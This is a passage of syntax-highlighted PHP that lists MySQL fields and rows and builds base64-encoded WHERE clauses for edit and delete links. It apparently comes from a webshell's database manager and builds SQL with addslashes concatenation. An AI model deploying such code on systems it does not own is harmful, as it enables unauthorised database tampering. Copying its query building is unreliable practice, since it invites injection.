<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)"</span>.(($<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'UNI'</span> || $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'PRI'</span>) ? <span style="color: #ad7fa8; font-style: italic;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).($<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>] == <span style="color: #ad7fa8; font-style: italic;">'auto_increment'</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;b&gt; - Auto&lt;/b&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).<span style="color: #ad7fa8; font-style: italic;">"&lt;/span&gt;&lt;/td&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">mn</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_assoc(</span>$<span style="color: #eeeeec;">result</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = $<span style="color: #eeeeec;">tmp</span> = $<span style="color: #eeeeec;">b1</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">mn</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span>=&gt;$<span style="color: #eeeeec;">inside</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">inside</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">key</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'UNI'</span> || $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">key</span>][<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>] == <span style="color: #ad7fa8; font-style: italic;">'auto_increment'</span> || $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">key</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'PRI'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = $<span style="color: #eeeeec;">key</span>.<span style="color: #ad7fa8; font-style: italic;">"='"</span>.<span style="color: #eeeeec; background-color: #2e3436;">addslashes(</span>$<span style="color: #eeeeec;">inside</span>).<span style="color: #ad7fa8; font-style: italic;">"'"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">break</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> .= $<span style="color: #eeeeec;">tmp</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">key</span>.<span style="color: #ad7fa8; font-style: italic;">"='"</span>.<span style="color: #eeeeec; background-color: #2e3436;">addslashes(</span>$<span style="color: #eeeeec;">inside</span>).<span style="color: #ad7fa8; font-style: italic;">"'"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tmp</span> = <span style="color: #ad7fa8; font-style: italic;">' AND '</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">mn</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span>=&gt;$<span style="color: #eeeeec;">inside</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">b1</span> .= <span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;'</span>.<span style="color: #eeeeec; background-color: #2e3436;">html_clean(</span>$<span style="color: #eeeeec;">inside</span>).<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = <span style="color: #eeeeec; background-color: #2e3436;">base64_encode(</span>$<span style="color: #eeeeec;">where</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">allowedit</span>) <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td nowrap&gt;&lt;a href="javascript:editrecord(\'edit\', \''</span>.$<span style="color: #eeeeec;">where</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span>.$<span style="color: #eeeeec;">where</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">b1</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">unset(</span>$<span style="color: #eeeeec;">b1</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">allowedit</span>) <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fieldnum</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_num_fields(</span>$<span style="color: #eeeeec;">result</span>);
